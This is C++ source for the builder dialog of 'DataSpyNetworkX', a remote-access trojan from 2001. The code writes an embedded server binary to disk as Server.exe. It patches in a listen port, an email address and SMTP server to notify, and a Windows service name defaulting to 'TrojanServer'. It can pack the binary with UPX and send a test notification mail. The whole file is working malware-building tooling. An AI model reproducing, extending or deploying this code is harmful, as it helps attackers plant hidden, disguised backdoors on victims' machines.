/* 
DataSpyNetworkX - DataSpy2k@Hotmail.com  Copyright (C) 2001 DataSpy
Release Source 0.4Beta.

  In no event will the author be held liable for any damages arising from the use of this code. 
  
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.
	
	  This program is distributed in the hope that it will be useful,
	  but WITHOUT ANY WARRANTY; without even the implied warranty of
	  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	  GNU General Public License for more details.
	  
		You should have received a copy of the GNU General Public License
		along with this program; if not, write to the Free Software
		Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
		
*/
#include "stdafx.h"
#include "EditServer.h"
#include "EditServerDlg.h"
#include "server.h"
#include "UPX.h"
#include "readme.h"

#include "ClientSocket.h"
#include "SocketException.h"
#include "ClieFunc.h"
#include <ctime>

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#define r_CHANNEL 'c'
#define r_QUERY   'q'
#define r_NOTICE  'n'

char cRepTo = r_NOTICE;

BOOL Win2k()
{
	OSVERSIONINFO osvi;	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	
	if(GetVersionEx(&osvi)==FALSE) return FALSE;
	
	return ((osvi.dwPlatformId == VER_PLATFORM_WIN32_NT) && (osvi.dwMajorVersion > 4) );
}

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();
	
	// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA
	
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL
	
	// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	afx_msg void OnDontAgree();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
//{{AFX_MSG_MAP(CAboutDlg)
ON_BN_CLICKED(IDOK2, OnDontAgree)
//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CEditServerDlg dialog
//#include <winuser.h>
//#include <richedit.h>

CEditServerDlg::CEditServerDlg(CWnd* pParent /*=NULL*/)
: CDialog(CEditServerDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CEditServerDlg)
	m_MailServer = _T("mail.telhai.ac.il");
	m_Port = _T("8001");
	m_Email = _T("nissimzo@edu.telhai.ac.il");
	m_Sender = _T("SenderName@mail.com");
	m_Mail_Port = _T("25");
	m_Localip = TRUE;
	m_Externalip = FALSE;
	m_Server_Name = _T("Trojan.exe");
	m_Servic_Name = _T("TrojanServer");
	m_Display_Name = _T("Trojan Server Service");
	m_PServer = TRUE;
	m_Status = _T("+ EditServer Online (Building the server)\r\n");
	//}}AFX_DATA_INIT
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	
	
}

void CEditServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CEditServerDlg)
	DDX_Text(pDX, IDC_EDIT1, m_MailServer);
	DDV_MaxChars(pDX, m_MailServer, 30);
	DDX_Text(pDX, IDC_EDIT2, m_Port);
	DDV_MaxChars(pDX, m_Port, 5);
	DDX_Text(pDX, IDC_EDIT3, m_Email);
	DDV_MaxChars(pDX, m_Email, 30);
	DDX_Text(pDX, IDC_EDIT5, m_Mail_Port);
	DDV_MaxChars(pDX, m_Mail_Port, 5);
	DDX_Text(pDX, IDC_EDIT7, m_Sender);
	DDV_MaxChars(pDX, m_Sender, 30);
	DDX_Check(pDX, IDC_CHECK2, m_PServer);
	DDX_Text(pDX, IDC_STATUS, m_Status);
	DDX_Check(pDX, IDC_RADIO1, m_Localip);
	DDX_Check(pDX, IDC_RADIO2, m_Externalip);
	DDX_Text(pDX, IDC_EDIT4, m_Servic_Name);
	DDV_MaxChars(pDX, m_Servic_Name, 20);
	DDX_Text(pDX, IDC_EDIT8, m_Server_Name);
	DDV_MaxChars(pDX, m_Server_Name, 30);
	DDX_Text(pDX, IDC_EDIT9, m_Display_Name);
	DDV_MaxChars(pDX, m_Display_Name, 30);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CEditServerDlg, CDialog)
//{{AFX_MSG_MAP(CEditServerDlg)
ON_WM_SYSCOMMAND()
ON_WM_PAINT()
ON_WM_QUERYDRAGICON()
ON_BN_CLICKED(IDC_RADIO1, OnChannel)
ON_BN_CLICKED(IDC_RADIO2, OnQuery)
ON_BN_CLICKED(IDC_RADIO3, OnNOTICE)
ON_BN_CLICKED(IDOK3, OnOk3)
//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CEditServerDlg message handlers

//Transparency Shit From Miranda ICQ :P
#include <fcntl.h>
#define LWA_ALPHA 0x02
#define WS_EX_LAYERED 0x080000
typedef BOOL (WINAPI *TmySetLayeredWindowAttributes)(HWND hwnd, COLORREF crKey, BYTE bAlpha, DWORD dwFlags);
TmySetLayeredWindowAttributes mySetLayeredWindowAttributes;
#define ALPHAVAL 245

BOOL CEditServerDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	
	// Add "About..." menu item to system menu.
	
	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);
	
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}
	
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here
	
	
	CAboutDlg dlg1;
	
	int nResponse1 = dlg1.DoModal();
	
	if (Win2k()) //Only windows 2000 plus plus supports
	{
		HMODULE			hUserDll;
		hUserDll = LoadLibrary("user32.dll");
		if (hUserDll) mySetLayeredWindowAttributes = (TmySetLayeredWindowAttributes)GetProcAddress(hUserDll, "SetLayeredWindowAttributes");
		HWND hwnd = m_hWnd;
		SetWindowLong(hwnd, GWL_EXSTYLE, GetWindowLong(hwnd, GWL_EXSTYLE) | WS_EX_LAYERED);
		if (mySetLayeredWindowAttributes) mySetLayeredWindowAttributes(hwnd, RGB(255,0,0), ALPHAVAL, LWA_ALPHA);//(BYTE)opts.alpha
	}
	
	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CEditServerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CEditServerDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting
		
		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);
		
		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;
		
		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

HCURSOR CEditServerDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}


#include <stdio.h>
#define MAX_PORT_LEN 5
#define MAX_MAIL_LEN 30
#define MAX_DATA_LEN 128
#define ZERO_LEN 0
void CEditServerDlg::OnOK() 
{
	//
	//Initalisation
	//	
	UpdateData(TRUE);	
	//srand((unsigned)time(NULL));
	//char cSplit = 'ç';
	
	
	char *cTempMail = new char[MAX_MAIL_LEN*2],
		*cTempPort = new char[MAX_PORT_LEN*2],
		*cTempMailServ = new char[MAX_MAIL_LEN*2],
		*cTempSenderMail = new char[MAX_MAIL_LEN*2],
		*cTempMailPort = new char[MAX_PORT_LEN*2],
		*cTempServName    = new char[MAX_MAIL_LEN*2],
		*cTempServcName   = new char[MAX_MAIL_LEN*2],
		*cTempDisplayName = new char[MAX_MAIL_LEN*2],
		*cStatus = new char[MAX_DATA_LEN*2];
	
	int iPort = lstrlen( m_Port     ),
		iEmail = lstrlen( m_Email  ),
		iSender = lstrlen( m_Sender  ),
		iSrvName = lstrlen( m_Server_Name  ),
		iSrvcName = lstrlen( m_Servic_Name  ),
		iDisplay = lstrlen( m_Display_Name  ),
		iMailPort = lstrlen( m_Mail_Port  ),
		iServ = lstrlen( m_MailServer   ),
		iLen = iPort + iEmail + iServ + iSender + iSrvName + iMailPort + iDisplay + iSrvcName;
	
	if ((iPort > MAX_PORT_LEN ) || (iEmail > MAX_MAIL_LEN) || (iServ > MAX_MAIL_LEN)
		|| (iMailPort > MAX_PORT_LEN ) || (iSender > MAX_MAIL_LEN) || (iSrvName > MAX_MAIL_LEN - 10)
		|| (iSrvcName > MAX_MAIL_LEN ) || (iDisplay > MAX_MAIL_LEN))
	{
		sprintf(cStatus,"Aborting build: User data to long: %i bytes over\r\n",iLen-(MAX_DATA_LEN -9));
		m_Status += _T(cStatus); UpdateData(FALSE);
		return;
	}
	
	if ((iPort = ZERO_LEN ) || (iEmail = ZERO_LEN) || (iServ = ZERO_LEN)
		|| (iMailPort = ZERO_LEN ) || (iSender = ZERO_LEN) || (iSrvName = ZERO_LEN)
		|| (iSrvcName = ZERO_LEN ) || (iDisplay = ZERO_LEN))
	{
		sprintf(cStatus,"Aborting build: User data to long: %i bytes over\r\n",iLen-(MAX_DATA_LEN -9));
		m_Status += _T(cStatus); UpdateData(FALSE);
		return;
	}
	sprintf(cStatus,"Building Server with %i bytes of user data\r\n",iLen+1);
	m_Status += _T(cStatus); UpdateData(FALSE); Sleep(1);
	
	
	//Port MailServer EMail
	*cTempMail		  = 0;
	*cTempPort		  = 0;
	*cTempMailServ    = 0;
	*cTempSenderMail  = 0;
	*cTempMailPort    = 0;
	*cTempServName    = 0;
	*cTempServcName   = 0;
	*cTempDisplayName = 0;
	
	strcat(cTempPort,m_Port);				//Port
	strcat(cTempMail,m_Email);				//Email
	strcat(cTempMailServ,m_MailServer);		//Mail Server
	strcat(cTempMailPort,m_Mail_Port);				//Port
	strcat(cTempSenderMail,m_Sender);				//Email
	strcat(cTempServName,m_Server_Name);
	strcat(cTempServcName,m_Servic_Name);
	strcat(cTempDisplayName,m_Display_Name);
	
	//
	//WriteFileToDisk
	//
	
	unsigned long cool;
	
	float iOriginal=0,iPack=0;
	char cServerName[] = "Server.exe\0";
	
	FILE *fout;
	if((fout = fopen(cServerName,"wb")) == NULL)
	{
		sprintf(cStatus,"Aborting Build: Error opening output file: %s\r\n",cServerName);
		m_Status += _T(cStatus); UpdateData(FALSE);
		return;
	}
	sprintf(cStatus,"Writing %s to disk\r\n",cServerName);
	m_Status += _T(cStatus); UpdateData(FALSE);Sleep(1);
	
	fwrite(DSNX,DSNX_LEN,1,fout); //write server
	
	cool = lstrlen(cTempPort);  // cool must have the length of the port
	fseek(fout,354644,SEEK_SET); //Settings
	fwrite(cTempPort,cool,1,fout);
	
	cool = lstrlen(cTempMail);  // cool must have the length of the Email
	fseek(fout,354656,SEEK_SET); //Settings
	fwrite(cTempMail,cool,1,fout);
	
	cool = lstrlen(cTempMailServ);  // cool must have the length of the Mail Server
	fseek(fout,354688,SEEK_SET); //Settings
	fwrite(cTempMailServ,cool,1,fout);
	
	cool = lstrlen(cTempSenderMail);  // cool must have the length of the Sender Mail
	fseek(fout,354720,SEEK_SET); //Settings
	fwrite(cTempSenderMail,cool,1,fout);
	
	cool = lstrlen(cTempMailPort);  // cool must have the length of the Mail port
	fseek(fout,354752,SEEK_SET); //Settings
	fwrite(cTempMailPort,cool,1,fout);
	
	cool = lstrlen(cTempServName);  // cool must have the length of the Server Name
	fseek(fout,354536,SEEK_SET); //Settings
	fwrite(cTempServName,cool,1,fout);
	
	cool = lstrlen(cTempServcName);  // cool must have the length of the Service Name
	fseek(fout,354564,SEEK_SET); //Settings
	fwrite(cTempServcName,cool,1,fout);
	
	cool = lstrlen(cTempDisplayName);  // cool must have the length of the Service DISPLAY name
	fseek(fout,354604,SEEK_SET); //Settings
	fwrite(cTempDisplayName,cool,1,fout);
	
	if(m_Externalip)
	{
		cool = 3;  // cool must have the length of the Flag for external ip or local
		fseek(fout,354764,SEEK_SET); //Settings
		fwrite("500",cool,1,fout);
	}
	
	fseek(fout,0,SEEK_END);
	iOriginal = ftell(fout);
	
	fclose(fout);
	
	if (m_PServer) 
	{
		if((fout = fopen("upxd.exe","wb")) == NULL)
		{
			sprintf(cStatus,"Aborting build: ERROR:2 - (BUG)\0");
			m_Status += _T(cStatus); UpdateData(FALSE);
			return;
		}
		
		fwrite(UPX,UPXLen,1,fout);
		fclose(fout);
		
		sprintf(cStatus,"upxd.exe -9 %s\0",cServerName);
		
		WinExec(cStatus,SW_SHOW);
		
		while(remove("upxd.exe") == -1);
		
		FILE *fpack;
		if((fpack = fopen(cServerName,"r")) == NULL)
		{
			sprintf(cStatus,"Couln't get packed server size *Shrug*\r\n");
			m_Status += _T(cStatus); UpdateData(FALSE); Sleep(1);
		}
		else
		{
			fseek(fpack,0,SEEK_END);
			iPack=ftell(fpack);
			fclose(fpack);
		}
		float iPcent = iPack/iOriginal;
		
		sprintf(cStatus,"%s packed %i bytes to %i bytes. %i percent.\r\n",cServerName,(int)iOriginal,(int)iPack,(int)(iPcent*100));
	}
	else		
		sprintf(cStatus,"Finnished build: %s, %i bytes\r\n",cServerName,(int)iOriginal);
	
	m_Status += _T(cStatus); UpdateData(FALSE);
	
	
	return;
}

void CAboutDlg::OnDontAgree() 
{
	exit(1);
}

void CEditServerDlg::OnChannel() //Sets reply to channel
{
	cRepTo = r_CHANNEL;
	
}

void CEditServerDlg::OnQuery() 
{
	cRepTo = r_QUERY;
	
}

void CEditServerDlg::OnNOTICE() 
{
	cRepTo = r_NOTICE;	
}

void CEditServerDlg::OnOk3() 
{
	UpdateData(TRUE);
	char *cTempMail = new char[MAX_MAIL_LEN*2],
		*cTempMailServ = new char[MAX_MAIL_LEN*2],
		*cTempSenderMail = new char[MAX_MAIL_LEN*2],
		*cTempMailPort = new char[MAX_PORT_LEN*2],
		*cStatus = new char[MAX_DATA_LEN*2];
	try
	{
		
		int	iEmail = lstrlen( m_Email  ),
			iSender = lstrlen( m_Sender  ),
			iMailPort = lstrlen( m_Mail_Port  ),
			iServ = lstrlen( m_MailServer   ),
			iLen = iEmail + iServ;
		
		if ((iEmail > MAX_MAIL_LEN) || (iServ > MAX_MAIL_LEN) || (iMailPort > MAX_PORT_LEN ) || (iSender > MAX_MAIL_LEN))
		{
			//Mofos have made all the shit too long
			sprintf(cStatus,"Cannot Send a Mail Probelm with length\r\n");
			m_Status += _T(cStatus); UpdateData(FALSE);
			return;
		}
		
		if ((iEmail == ZERO_LEN) || (iServ == ZERO_LEN)|| (iMailPort == ZERO_LEN ) || (iSender == ZERO_LEN))
		{
			sprintf(cStatus,"Cannot Send a Mail Probelm with length\r\n");
			m_Status += _T(cStatus); UpdateData(FALSE);
			return;
		}
		
		sprintf(cStatus,"Sending Mail...\r\n");
		m_Status += _T(cStatus); UpdateData(FALSE);	Sleep(1);
		
		*cTempMail = 0;
		*cTempMailServ = 0;
		*cTempSenderMail = 0;
		*cTempMailPort = 0;
		
		strcat(cTempMail,m_Email);				//Email
		strcat(cTempMailServ,m_MailServer);		//Mail Server
		strcat(cTempMailPort,m_Mail_Port);				//Port
		strcat(cTempSenderMail,m_Sender);				//Email
		
		if( atoi(cTempMailPort) != 0)
		{
			SMTP_Handle(cTempMailServ,cTempMail,"Try your mail...",cTempSenderMail,atoi(cTempMailPort));
			sprintf(cStatus,"Mail sent Sucssefully\r\n");
			m_Status += _T(cStatus); UpdateData(FALSE); Sleep(1);
		}
		else
		{
			sprintf(cStatus,"Type a lligal Port\r\n");
			m_Status += _T(cStatus); UpdateData(FALSE); Sleep(1);
		}
		
	}
	catch(...)
	{
		sprintf(cStatus,"Can't send the mail check your data\r\n");
		m_Status += _T(cStatus); UpdateData(FALSE); Sleep(1);
	}
	
}
